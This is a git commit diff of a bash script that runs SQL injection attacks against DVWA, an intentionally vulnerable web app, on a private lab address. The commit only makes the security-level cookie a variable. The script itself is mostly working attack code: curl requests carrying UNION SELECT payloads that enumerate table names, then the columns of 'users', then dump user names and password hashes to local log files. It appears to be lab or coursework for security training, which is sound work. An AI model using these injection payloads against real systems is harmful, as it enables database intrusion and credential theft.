d5ebea65139b0c0d077745999eaa27b6ad6023a3
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-05-12 13:16:31 +0200

    Update security level handling in low_security_level.sh

--- low_security_level.sh
+++ low_security_level.sh
@@ -22,16 +22,19 @@ curl -s -b cookies.txt \
   http://192.168.56.105/DVWA/login.php
 
 
+
 #saves result of table name retrieval to local log file
 {
 echo "Security level: $SECURITY"
 echo "Attempting to retrieve table names..."
 echo "---------------------------------------------------"
 RESPONSE=$(curl -s \
-  -b "PHPSESSID=$PHPSESSID; security=low" \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
   "http://192.168.56.105/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20table_name%2C%20NULL%20%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20%3D%20database%28%29%23&Submit=Submit")
 echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' #Removes header (First name:) from result
 }> /home/kali/sqli_low1.log
+
+
 
 #saves result of column name retrieval to local log file
 {
@@ -39,10 +42,12 @@ echo "Security level: $SECURITY"
 echo "Attempting to retrieve column names..."
 echo "---------------------------------------------------"
 RESPONSE=$(curl -s \
-  -b "PHPSESSID=$PHPSESSID; security=low" \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
   "http://192.168.56.105/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20column_name%2C%20NULL%20%20FROM%20information_schema.columns%20%20WHERE%20table_name%20%3D%20%27users%27%23&Submit=Submit")
 echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' #Removes header (First name:) from result
 }> /home/kali/sqli_low2.log
+
+
 
 #saves result of credential retrieval to local log file
 {
@@ -50,7 +55,7 @@ echo "Security level: $SECURITY"
 echo "Attempting to retrieve credentials..."
 echo "---------------------------------------------------"
 RESPONSE=$(curl -s \
-  -b "PHPSESSID=$PHPSESSID; security=low" \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
   "http://192.168.56.105/DVWA/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20user%2C%20password%20FROM%20users%23&Submit=Submit")
 echo "$RESPONSE" | grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' | paste - - #Removes header (First name:) from result. Returns username and password on the same line
 }> /home/kali/sqli_low3.log
